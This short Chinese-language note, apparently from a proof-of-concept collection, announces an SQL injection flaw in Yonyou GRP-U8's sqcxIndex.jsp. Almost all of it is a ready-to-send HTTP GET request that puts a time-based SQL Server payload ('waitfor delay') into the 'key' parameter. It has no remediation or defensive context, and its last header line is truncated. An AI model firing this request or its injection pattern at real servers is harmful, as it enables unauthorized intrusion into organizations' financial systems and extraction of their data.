## 用友GRP-U8-sqcxIndex.jsp存在SQL注入漏洞

## poc
```
GET /u8qx/sqcxIndex.jsp?key=1');+waitfor+delay+'0:0:3'-- HTTP/1.1
Host: 
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=06D017067FC6F3BFA6150315042277B6
x-forwarded-for: 127.0.0.1
Connection: clo
```
